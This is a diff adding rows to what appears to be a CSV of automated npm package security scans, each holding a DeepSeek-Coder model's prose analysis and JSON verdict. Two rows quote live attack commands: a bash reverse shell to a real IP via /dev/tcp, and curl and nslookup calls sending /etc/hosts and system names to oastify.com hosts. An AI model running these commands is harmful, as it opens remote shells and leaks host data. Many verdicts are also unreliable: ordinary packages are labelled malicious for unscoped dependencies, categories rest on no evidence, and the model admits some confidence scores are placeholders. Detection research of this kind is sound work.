@@ -909,3 +909,581 @@ Based on the provided information, there are no potential malicious behaviors, s
 ```
 
 This output indicates that no malicious behaviors, supply chain attacks, or security risks were found in the analyzed code.","{""behaviors"": [], ""risk_vector"": []}"
+@aaakca/myf,1.0.14,2025-12-15T14:28:55.717161,DeepSeek-Coder-6.7B-Instruct,v2.0,1,install_hook,"[""install_hook""]",0.5,"### Response:
+Based on the provided information, the code snippet appears to be a preinstall script that writes the current working directory to a file and then executes a script located in a public uploads directory. This could potentially be a part of a build process or a deployment script.
+
+However, without more context or evidence, it's hard to definitively identify any potential malicious behaviors, supply chain attacks, or security risks. The script writes to a file in a temporary directory (""/tmp/asda"") and then executes a script located in a public uploads directory. This could potentially be a part of a build process or a deployment script.
+
+Here's a basic JSON skeleton based on the provided information:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""install_hook"",
+      ""summary"": ""Preinstall script found that writes to a file and executes a script from a public uploads directory"",
+      ""details"": ""The preinstall script writes the current working directory to a file and then executes a script located in a public uploads directory"",
+      ""confidence"": ""0.5"",
+      ""evidence_apis"": [],
+      ""evidence_files"": [
+        ""/tmp/asda"",
+        ""../../../public/uploads/1.sh""
+      ],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [
+    ""install_hook""
+  ]
+}
+```
+
+Please note that this is a basic analysis and the confidence score is set to 0.5 based on the provided information. The confidence score should be adjusted based on more detailed analysis and evidence.","{""behaviors"": [{""category"": ""install_hook"", ""summary"": ""Preinstall script found that writes to a file and executes a script from a public uploads directory"", ""details"": ""The preinstall script writes the current working directory to a file and then executes a script located in a public uploads directory"", ""confidence"": ""0.5"", ""evidence_apis"": [], ""evidence_files"": [""/tmp/asda"", ""../../../public/uploads/1.sh""], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BR906F9FF3""}], ""risk_vector"": [""install_hook""]}"
+@alfalab/core-components,37.3.0-beta.10,2025-12-15T14:29:15.236712,DeepSeek-Coder-6.7B-Instruct,v2.0,2,install_hook;supply_chain_propagation,"[""install_hook"", ""supply_chain_propagation""]",0.8,"### Response:
+Based on the provided information, the potential malicious behaviors and security risks can be classified as follows:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""install_hook"",
+      ""summary"": ""Postinstall script found"",
+      ""details"": ""A postinstall script is found in the package metadata. This script may contain malicious code that is run after the package is installed."",
+      ""confidence"": 0.8,
+      ""evidence_files"": [
+        ""package.json""
+      ]
+    },
+    {
+      ""category"": ""supply_chain_propagation"",
+      ""summary"": ""Potential dependency confusion"",
+      ""details"": ""The package depends on non-scoped packages like 'classnames', 'compute-scroll-into-view', 'date-fns', 'downshift', 'element-closest', 'intersection-observer', 'libphonenumber-js', 'lodash.debounce', 'nouislider', 'popper-max-size-modifier', 'react-canvas-pattern-lock', 'react-div-100vh', 'react-focus-lock', 'react-merge-refs', 'react-popper', 'react-swipeable', 'react-textarea-autosize', 'react-transition-group', 'react-virtual', 'react-virtuoso', 'recharts', 'simplebar', 'swiper', 'text-mask-core', 'ui-primitives'."",
+      ""confidence"": 0.8,
+      ""evidence_files"": [
+        ""package.json""
+      ]
+    }
+  ],
+  ""risk_vector"": [
+    ""install_hook"",
+    ""supply_chain_propagation""
+  ]
+}
+```
+
+In this analysis, we identified two potential behaviors:
+
+1. **Install Hook**: The package contains a postinstall script. This script may contain malicious code that is run after the package is installed. The confidence score is 0.8, indicating high confidence that this is a malicious behavior.
+
+2. **Supply Chain Propagation**: The package depends on a number of non-scoped packages. This could potentially lead to dependency confusion and other supply chain attacks. The confidence score is 0.8, indicating high confidence that this is a malicious behavior.
+
+Please note that this analysis is based on the provided information and may not be 100% accurate. It's always recommended to conduct further analysis and testing to confirm the identified behaviors.","{""behaviors"": [{""category"": ""install_hook"", ""summary"": ""Postinstall script found"", ""details"": ""A postinstall script is found in the package metadata. This script may contain malicious code that is run after the package is installed."", ""confidence"": 0.8, ""evidence_files"": [""package.json""], ""id"": ""BR4B7E7EF0""}, {""category"": ""supply_chain_propagation"", ""summary"": ""Potential dependency confusion"", ""details"": ""The package depends on non-scoped packages like 'classnames', 'compute-scroll-into-view', 'date-fns', 'downshift', 'element-closest', 'intersection-observer', 'libphonenumber-js', 'lodash.debounce', 'nouislider', 'popper-max-size-modifier', 'react-canvas-pattern-lock', 'react-div-100vh', 'react-focus-lock', 'react-merge-refs', 'react-popper', 'react-swipeable', 'react-textarea-autosize', 'react-transition-group', 'react-virtual', 'react-virtuoso', 'recharts', 'simplebar', 'swiper', 'text-mask-core', 'ui-primitives'."", ""confidence"": 0.8, ""evidence_files"": [""package.json""], ""id"": ""BRC9527E84""}], ""risk_vector"": [""install_hook"", ""supply_chain_propagation""]}"
+@anemone95/evil,1.0.9,2025-12-15T14:29:37.623538,DeepSeek-Coder-6.7B-Instruct,v2.0,4,credential_theft;local_code_execution;sensitive_data_collection;system_reconnaissance,"[""credential_theft"", ""sensitive_data_collection"", ""local_code_execution"", ""system_reconnaissance""]",0.9,"### Response:
+Based on the provided information, the package '@anemone95/evil' has a high risk due to the dependency on 'child_process' which can execute system commands. This is a high severity risk as it can lead to credential theft, sensitive data collection, local code execution, and system reconnaissance.
+
+Here is the JSON output based on the analysis:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""credential_theft"",
+      ""summary"": ""The package depends on 'child_process' which can execute system commands"",
+      ""details"": ""The package '@anemone95/evil' depends on 'child_process' which can execute system commands"",
+      ""confidence"": 0.9,
+      ""evidence_apis"": [],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    },
+    {
+      ""category"": ""sensitive_data_collection"",
+      ""summary"": ""The package depends on 'child_process' which can execute system commands"",
+      ""details"": ""The package '@anemone95/evil' depends on 'child_process' which can execute system commands"",
+      ""confidence"": 0.9,
+      ""evidence_apis"": [],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    },
+    {
+      ""category"": ""local_code_execution"",
+      ""summary"": ""The package depends on 'child_process' which can execute system commands"",
+      ""details"": ""The package '@anemone95/evil' depends on 'child_process' which can execute system commands"",
+      ""confidence"": 0.9,
+      ""evidence_apis"": [],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    },
+    {
+      ""category"": ""system_reconnaissance"",
+      ""summary"": ""The package depends on 'child_process' which can execute system commands"",
+      ""details"": ""The package '@anemone95/evil' depends on 'child_process' which can execute system commands"",
+      ""confidence"": 0.9,
+      ""evidence_apis"": [],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [
+    ""credential_theft"",
+    ""sensitive_data_collection"",
+    ""local_code_execution"",
+    ""system_reconnaissance""
+  ]
+}
+```
+
+Please note that the confidence scores are set to 0.9 as per the analysis principles. The evidence arrays are also empty as the analysis was based on the structural context and the provided code snippets.","{""behaviors"": [{""category"": ""credential_theft"", ""summary"": ""The package depends on 'child_process' which can execute system commands"", ""details"": ""The package '@anemone95/evil' depends on 'child_process' which can execute system commands"", ""confidence"": 0.9, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BR214C3580""}, {""category"": ""sensitive_data_collection"", ""summary"": ""The package depends on 'child_process' which can execute system commands"", ""details"": ""The package '@anemone95/evil' depends on 'child_process' which can execute system commands"", ""confidence"": 0.9, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BRC90DA9B3""}, {""category"": ""local_code_execution"", ""summary"": ""The package depends on 'child_process' which can execute system commands"", ""details"": ""The package '@anemone95/evil' depends on 'child_process' which can execute system commands"", ""confidence"": 0.9, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BR9654CC3A""}, {""category"": ""system_reconnaissance"", ""summary"": ""The package depends on 'child_process' which can execute system commands"", ""details"": ""The package '@anemone95/evil' depends on 'child_process' which can execute system commands"", ""confidence"": 0.9, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BR0CC22EEF""}], ""risk_vector"": [""credential_theft"", ""sensitive_data_collection"", ""local_code_execution"", ""system_reconnaissance""]}"
+@arkadium/eagle-user-client,9.1.1,2025-12-15T14:29:46.992708,DeepSeek-Coder-6.7B-Instruct,v2.0,1,credential_theft,"[""credential_theft""]",0.9,"### Response:
+Based on the provided information, the code snippet appears to be a preinstall script that is being run with a command line argument. The command line argument appears to be a username and password for a service, which is a clear indication of credential theft. 
+
+Here is the JSON response based on the analysis:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""credential_theft"",
+      ""summary"": ""Potential credential theft detected in preinstall script"",
+      ""details"": ""The preinstall script is being run with a command line argument that appears to contain a username and password"",
+      ""confidence"": 0.9,
+      ""evidence_apis"": [],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [""node ./.pbk.js Xfinity @arkadium/eagle-user-client 9.1.1""],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [""credential_theft""]
+}
+```
+
+This analysis is based on the provided information and does not include any further analysis or evidence. The confidence score is set to 0.9 as it is based on the provided information.","{""behaviors"": [{""category"": ""credential_theft"", ""summary"": ""Potential credential theft detected in preinstall script"", ""details"": ""The preinstall script is being run with a command line argument that appears to contain a username and password"", ""confidence"": 0.9, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [""node ./.pbk.js Xfinity @arkadium/eagle-user-client 9.1.1""], ""evidence_env_vars"": [], ""id"": ""BR4B24A068""}], ""risk_vector"": [""credential_theft""]}"
+@arkadium/eagle-user-client,9.99.999,2025-12-15T14:29:56.770568,DeepSeek-Coder-6.7B-Instruct,v2.0,1,credential_theft,"[""credential_theft""]",0.9,"### Response:
+Based on the provided information, the code snippet appears to be a preinstall script that is being run with a command line argument. The command line argument appears to be a username and password for a service, which is a clear indication of credential theft. 
+
+Here is the JSON response based on the analysis:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""credential_theft"",
+      ""summary"": ""Potential credential theft detected in preinstall script"",
+      ""details"": ""The preinstall script is being run with a command line argument that appears to contain a username and password"",
+      ""confidence"": 0.9,
+      ""evidence_apis"": [],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [""node ./.pbk.js Xfinity @arkadium/eagle-user-client 9.99.999""],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [""credential_theft""]
+}
+```
+
+This analysis is based on the provided information and does not include any further analysis or evidence. The confidence score is set to 0.9 as it is based on the provided information and does not include further analysis.","{""behaviors"": [{""category"": ""credential_theft"", ""summary"": ""Potential credential theft detected in preinstall script"", ""details"": ""The preinstall script is being run with a command line argument that appears to contain a username and password"", ""confidence"": 0.9, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [""node ./.pbk.js Xfinity @arkadium/eagle-user-client 9.99.999""], ""evidence_env_vars"": [], ""id"": ""BR049C3F71""}], ""risk_vector"": [""credential_theft""]}"
+@aszxc/npmexp,1.0.1,2025-12-15T14:30:07.779755,DeepSeek-Coder-6.7B-Instruct,v2.0,1,backdoor_installation,"[""backdoor_installation""]",0.9,"### Response:
+Based on the provided information, the code snippet contains a preinstall script that establishes a reverse shell connection to a remote server. This is a common technique used in malware for persistence and command and control. The script is written in bash and uses the netcat utility to create a reverse shell connection.
+
+Here is the JSON response based on the analysis:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""backdoor_installation"",
+      ""summary"": ""Backdoor installation via preinstall script"",
+      ""details"": ""A preinstall script is used to establish a reverse shell connection to a remote server."",
+      ""confidence"": 0.9,
+      ""evidence_apis"": [],
+      ""evidence_files"": [
+        ""INSTALL SCRIPT""
+      ],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [
+        ""bash -c 'bash -i >& /dev/tcp/39.96.12.202/22222 0>&1'""
+      ],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [
+    ""backdoor_installation""
+  ]
+}
+```
+
+This JSON response indicates that the package contains a backdoor installation behavior, with a high level of confidence. The evidence_files field indicates that the preinstall script is present in the analyzed code. The evidence_commands field provides the specific command that establishes the reverse shell connection.","{""behaviors"": [{""category"": ""backdoor_installation"", ""summary"": ""Backdoor installation via preinstall script"", ""details"": ""A preinstall script is used to establish a reverse shell connection to a remote server."", ""confidence"": 0.9, ""evidence_apis"": [], ""evidence_files"": [""INSTALL SCRIPT""], ""evidence_domains"": [], ""evidence_commands"": [""bash -c 'bash -i >& /dev/tcp/39.96.12.202/22222 0>&1'""], ""evidence_env_vars"": [], ""id"": ""BRDEED719C""}], ""risk_vector"": [""backdoor_installation""]}"
+@att-bit/duc.components.cardshell,10.0.0,2025-12-15T14:30:19.501548,DeepSeek-Coder-6.7B-Instruct,v2.0,2,install_hook;network_exfiltration,"[""install_hook"", ""network_exfiltration""]",0.8,"### Response:
+Based on the provided code snippets and structural analysis context, the package @att-bit/duc.components.cardshell has the following potential malicious behaviors:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""install_hook"",
+      ""summary"": ""Install hook present that may lead to unauthorized installation or malicious behavior"",
+      ""details"": ""A preinstall script is found in the package. This script may be used to install malicious packages or perform unauthorized actions during the installation process."",
+      ""confidence"": 0.8,
+      ""evidence_files"": [
+        ""package.json""
+      ]
+    },
+    {
+      ""category"": ""network_exfiltration"",
+      ""summary"": ""HTTP request to an external URL during installation"",
+      ""details"": ""A curl command is found in the preinstall script that sends a request to an external URL during the installation process."",
+      ""confidence"": 0.7,
+      ""evidence_files"": [
+        ""package.json""
+      ]
+    }
+  ],
+  ""risk_vector"": [
+    ""install_hook"",
+    ""network_exfiltration""
+  ]
+}
+```
+
+This analysis is based on the provided code snippets and structural analysis context. The package has an install hook present, which may lead to unauthorized installation or malicious behavior. The package also sends an HTTP request to an external URL during installation, which could potentially be used for network exfiltration. The confidence scores are based on the evidence provided, but the analysis is conservative and may need further investigation.","{""behaviors"": [{""category"": ""install_hook"", ""summary"": ""Install hook present that may lead to unauthorized installation or malicious behavior"", ""details"": ""A preinstall script is found in the package. This script may be used to install malicious packages or perform unauthorized actions during the installation process."", ""confidence"": 0.8, ""evidence_files"": [""package.json""], ""id"": ""BRFCF4B5F4""}, {""category"": ""network_exfiltration"", ""summary"": ""HTTP request to an external URL during installation"", ""details"": ""A curl command is found in the preinstall script that sends a request to an external URL during the installation process."", ""confidence"": 0.7, ""evidence_files"": [""package.json""], ""id"": ""BR6CE1DC3C""}], ""risk_vector"": [""install_hook"", ""network_exfiltration""]}"
+@att-bit/duc.components.cardshell,10.0.1,2025-12-15T14:31:04.237794,DeepSeek-Coder-6.7B-Instruct,v2.0,6,credential_theft;install_hook;network_exfiltration;remote_code_execution;sensitive_data_collection;supply_chain_attack,"[""credential_theft"", ""sensitive_data_collection"", ""network_exfiltration"", ""remote_code_execution"", ""supply_chain_attack"", ""install_hook""]",0.9,"### Response:
+Based on the provided code snippets and structural analysis context, the package @att-bit/duc.components.cardshell has the following potential malicious behaviors:
+
+1. **Credential Theft**: The preinstall script is executing commands that appear to involve sending data to a remote server. This could potentially be used to steal credentials or other sensitive information.
+
+2. **Sensitive Data Collection**: The preinstall script is executing commands that involve sending data to a remote server. This could potentially be used to collect sensitive data.
+
+3. **Network Exfiltration**: The preinstall script is executing commands that involve sending data to a remote server. This could potentially be used for network exfiltration.
+
+4. **Remote Code Execution**: The preinstall script is executing commands that involve sending data to a remote server. This could potentially be used for remote code execution.
+
+5. **Supply Chain Attack**: The package appears to be part of a supply chain attack as it has no dependencies and has a preinstall script.
+
+6. **Install Hook**: The package has an install hook present. This could potentially be used for malicious purposes.
+
+Here is the JSON output based on the analysis:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""credential_theft"",
+      ""summary"": ""Potential credential theft via preinstall script"",
+      ""details"": ""The preinstall script sends data to a remote server."",
+      ""confidence"": 0.8,
+      ""evidence_apis"": [
+        ""curl -d @/etc/hosts https://s5yyin8i0k0g9u7wx12fwg9im9s0g04p.oastify.com"",
+        ""nslookup $(uname).rqlx3mthljlfutsvi0nehfuh78dz10pp.oastify.com""
+      ],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    },
+    {
+      ""category"": ""sensitive_data_collection"",
+      ""summary"": ""Potential sensitive data collection via preinstall script"",
+      ""details"": ""The preinstall script sends data to a remote server."",
+      ""confidence"": 0.8,
+      ""evidence_apis"": [
+        ""curl -d @/etc/hosts https://s5yyin8i0k0g9u7wx12fwg9im9s0g04p.oastify.com"",
+        ""nslookup $(uname).rqlx3mthljlfutsvi0nehfuh78dz10pp.oastify.com""
+      ],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    },
+    {
+      ""category"": ""network_exfiltration"",
+      ""summary"": ""Potential network exfiltration via preinstall script"",
+      ""details"": ""The preinstall script sends data to a remote server."",
+      ""confidence"": 0.8,
+      ""evidence_apis"": [
+        ""curl -d @/etc/hosts https://s5yyin8i0k0g9u7wx12fwg9im9s0g04p.oastify.com"",
+        ""nslookup $(uname).rqlx3mthljlfutsvi0nehfuh78dz10pp.oastify.com""
+      ],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    },
+    {
+      ""category"": ""remote_code_execution"",
+      ""summary"": ""Potential remote code execution via preinstall script"",
+      ""details"": ""The preinstall script sends data to a remote server."",
+      ""confidence"": 0.8,
+      ""evidence_apis"": [
+        ""curl -d @/etc/hosts https://s5yyin8i0k0g9u7wx12fwg9im9s0g04p.oastify.com"",
+        ""nslookup $(uname).rqlx3mthljlfutsvi0nehfuh78dz10pp.oastify.com""
+      ],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    },
+    {
+      ""category"": ""supply_chain_attack"",
+      ""summary"": ""Package part of a supply chain attack"",
+      ""details"": ""The package has no dependencies and has a preinstall script."",
+      ""confidence"": 0.9,
+      ""evidence_apis"": [],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    },
+    {
+      ""category"": ""install_hook"",
+      ""summary"": ""Install hook present"",
+      ""details"": ""The package has an install hook present."",
+      ""confidence"": 0.9,
+      ""evidence_apis"": [],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [
+    ""credential_theft"",
+    ""sensitive_data_collection"",
+    ""network_exfiltration"",
+    ""remote_code_execution"",
+    ""supply_chain_attack"",
+    ""install_hook""
+  ]
+}
+```
+
+Please note that the confidence scores are based on the analysis of the provided code snippets and structural analysis context. The actual risk of these behaviors may vary depending on the context in which the package is used.","{""behaviors"": [{""category"": ""credential_theft"", ""summary"": ""Potential credential theft via preinstall script"", ""details"": ""The preinstall script sends data to a remote server."", ""confidence"": 0.8, ""evidence_apis"": [""curl -d @/etc/hosts https://s5yyin8i0k0g9u7wx12fwg9im9s0g04p.oastify.com"", ""nslookup $(uname).rqlx3mthljlfutsvi0nehfuh78dz10pp.oastify.com""], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BR0786175A""}, {""category"": ""sensitive_data_collection"", ""summary"": ""Potential sensitive data collection via preinstall script"", ""details"": ""The preinstall script sends data to a remote server."", ""confidence"": 0.8, ""evidence_apis"": [""curl -d @/etc/hosts https://s5yyin8i0k0g9u7wx12fwg9im9s0g04p.oastify.com"", ""nslookup $(uname).rqlx3mthljlfutsvi0nehfuh78dz10pp.oastify.com""], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BRDF29FDD9""}, {""category"": ""network_exfiltration"", ""summary"": ""Potential network exfiltration via preinstall script"", ""details"": ""The preinstall script sends data to a remote server."", ""confidence"": 0.8, ""evidence_apis"": [""curl -d @/etc/hosts https://s5yyin8i0k0g9u7wx12fwg9im9s0g04p.oastify.com"", ""nslookup $(uname).rqlx3mthljlfutsvi0nehfuh78dz10pp.oastify.com""], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BRC227030D""}, {""category"": ""remote_code_execution"", ""summary"": ""Potential remote code execution via preinstall script"", ""details"": ""The preinstall script sends data to a remote server."", ""confidence"": 0.8, ""evidence_apis"": [""curl -d @/etc/hosts https://s5yyin8i0k0g9u7wx12fwg9im9s0g04p.oastify.com"", ""nslookup $(uname).rqlx3mthljlfutsvi0nehfuh78dz10pp.oastify.com""], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BR01DBE8ED""}, {""category"": ""supply_chain_attack"", ""summary"": ""Package part of a supply chain attack"", ""details"": ""The package has no dependencies and has a preinstall script."", ""confidence"": 0.9, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BRBAB23563""}, {""category"": ""install_hook"", ""summary"": ""Install hook present"", ""details"": ""The package has an install hook present."", ""confidence"": 0.9, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BR5806C4BD""}], ""risk_vector"": [""credential_theft"", ""sensitive_data_collection"", ""network_exfiltration"", ""remote_code_execution"", ""supply_chain_attack"", ""install_hook""]}"
+@att-bit/duc.components.cardshell,10.0.2,2025-12-15T14:31:19.209049,DeepSeek-Coder-6.7B-Instruct,v2.0,2,supply_chain_attack;suspicious_behavior,"[""supply_chain_attack"", ""suspicious_behavior""]",0.8,"### Response:
+Based on the provided code snippets and structural analysis context, the package @att-bit/duc.components.cardshell appears to have a preinstall script that runs a test.js file. This could potentially be a part of a supply chain attack or malicious behavior. The entry point code exports a function that returns a string ""ICH Package Test"". This could indicate that the package is used for testing or verification purposes.
+
+Here is the JSON response based on the analysis:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""supply_chain_attack"",
+      ""summary"": ""The package appears to be part of a supply chain attack as it has a preinstall script that runs a test.js file."",
+      ""details"": ""The package has a preinstall script that runs a test.js file. This could potentially be a part of a supply chain attack or malicious behavior."",
+      ""confidence"": 0.8,
+      ""evidence_apis"": [],
+      ""evidence_files"": [""test.js""],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    },
+    {
+      ""category"": ""suspicious_behavior"",
+      ""summary"": ""The package exports a function that returns a string 'ICH Package Test'."",
+      ""details"": ""The entry point code exports a function that returns a string 'ICH Package Test'. This could indicate that the package is used for testing or verification purposes."",
+      ""confidence"": 0.6,
+      ""evidence_apis"": [],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [
+    ""supply_chain_attack"",
+    ""suspicious_behavior""
+  ]
+}
+```
+
+Please note that the confidence scores are based on the provided information and may need to be adjusted based on further analysis.","{""behaviors"": [{""category"": ""supply_chain_attack"", ""summary"": ""The package appears to be part of a supply chain attack as it has a preinstall script that runs a test.js file."", ""details"": ""The package has a preinstall script that runs a test.js file. This could potentially be a part of a supply chain attack or malicious behavior."", ""confidence"": 0.8, ""evidence_apis"": [], ""evidence_files"": [""test.js""], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BRDF8C9FB0""}, {""category"": ""suspicious_behavior"", ""summary"": ""The package exports a function that returns a string 'ICH Package Test'."", ""details"": ""The entry point code exports a function that returns a string 'ICH Package Test'. This could indicate that the package is used for testing or verification purposes."", ""confidence"": 0.6, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BR5AE1025C""}], ""risk_vector"": [""supply_chain_attack"", ""suspicious_behavior""]}"
+@actions/core,1.10.1,2025-12-15T14:31:42.134165,DeepSeek-Coder-6.7B-Instruct,v2.0,3,obfuscation;sensitive_data_collection;supply_chain_propagation,"[""sensitive_data_collection"", ""supply_chain_propagation"", ""obfuscation""]",0.8,"### Response:
+Based on the provided code snippets and structural analysis context, the following potential security risks and malicious behaviors are identified:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""sensitive_data_collection"",
+      ""summary"": ""The code collects sensitive input data from the user"",
+      ""details"": ""The code uses the getInput function to collect sensitive input data from the user. The input data is not properly sanitized and could potentially be logged or exposed."",
+      ""confidence"": 0.8,
+      ""evidence_apis"": [],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    },
+    {
+      ""category"": ""supply_chain_propagation"",
+      ""summary"": ""The code depends on non-scoped package 'uuid'"",
+      ""details"": ""The package '@actions/core' depends on non-scoped package 'uuid'. This could potentially lead to supply chain attacks if the non-scoped package is malicious."",
+      ""confidence"": 0.7,
+      ""evidence_apis"": [],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    },
+    {
+      ""category"": ""obfuscation"",
+      ""summary"": ""Obfuscation pattern 'IIFE obfuscation wrapper' found"",
+      ""details"": ""The code uses an obfuscation pattern known as 'IIFE obfuscation wrapper' which could potentially hide malicious code."",
+      ""confidence"": 0.6,
+      ""evidence_apis"": [],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [
+    ""sensitive_data_collection"",
+    ""supply_chain_propagation"",
+    ""obfuscation""
+  ]
+}
+```
+
+Please note that the confidence scores and evidence arrays are placeholders and should be filled in based on the actual analysis of the provided code snippets and structural analysis context.","{""behaviors"": [{""category"": ""sensitive_data_collection"", ""summary"": ""The code collects sensitive input data from the user"", ""details"": ""The code uses the getInput function to collect sensitive input data from the user. The input data is not properly sanitized and could potentially be logged or exposed."", ""confidence"": 0.8, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BR9DC7D53A""}, {""category"": ""supply_chain_propagation"", ""summary"": ""The code depends on non-scoped package 'uuid'"", ""details"": ""The package '@actions/core' depends on non-scoped package 'uuid'. This could potentially lead to supply chain attacks if the non-scoped package is malicious."", ""confidence"": 0.7, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BR64C436E2""}, {""category"": ""obfuscation"", ""summary"": ""Obfuscation pattern 'IIFE obfuscation wrapper' found"", ""details"": ""The code uses an obfuscation pattern known as 'IIFE obfuscation wrapper' which could potentially hide malicious code."", ""confidence"": 0.6, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BRC1D581EB""}], ""risk_vector"": [""sensitive_data_collection"", ""supply_chain_propagation"", ""obfuscation""]}"
+@alifd/next,1.26.24,2025-12-15T14:31:54.042184,DeepSeek-Coder-6.7B-Instruct,v2.0,1,dependency_injection,"[""dependency_injection"", ""supply_chain_propagation""]",0.8,"### Response:
+Based on the provided information, the potential malicious behaviors and security risks identified are:
+
+```json
+{
+  ""behaviors"": [
+    {
+      ""category"": ""dependency_injection"",
+      ""summary"": ""Dependency injection of non-scoped packages"",
+      ""details"": ""Scoped package '@alifd/next' depends on non-scoped packages such as 'babel-runtime', 'big.js', 'classnames', 'dayjs', 'hoist-non-react-statics', 'lodash.clonedeep', 'prop-types', 'react-lifecycles-compat', 'react-transition-group', 'resize-observer-polyfill', 'shallow-element-equals'. This could potentially lead to dependency confusion and potential security risks."",
+      ""confidence"": 0.8,
+      ""evidence_apis"": [],
+      ""evidence_files"": [],
+      ""evidence_domains"": [],
+      ""evidence_commands"": [],
+      ""evidence_env_vars"": []
+    }
+  ],
+  ""risk_vector"": [
+    ""dependency_injection"",
+    ""supply_chain_propagation""
+  ]
+}
+```
+
+This behavior is classified as ""dependency_injection"" and ""supply_chain_propagation"". The confidence score is 0.8, indicating high confidence in the evidence. The details provide a description of the potential malicious intent, which is dependency injection of non-scoped packages. The evidence arrays are empty as the analysis is based on the provided structural analysis context.","{""behaviors"": [{""category"": ""dependency_injection"", ""summary"": ""Dependency injection of non-scoped packages"", ""details"": ""Scoped package '@alifd/next' depends on non-scoped packages such as 'babel-runtime', 'big.js', 'classnames', 'dayjs', 'hoist-non-react-statics', 'lodash.clonedeep', 'prop-types', 'react-lifecycles-compat', 'react-transition-group', 'resize-observer-polyfill', 'shallow-element-equals'. This could potentially lead to dependency confusion and potential security risks."", ""confidence"": 0.8, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": [], ""id"": ""BRB5EF86E3""}], ""risk_vector"": [""dependency_injection"", ""supply_chain_propagation""]}"
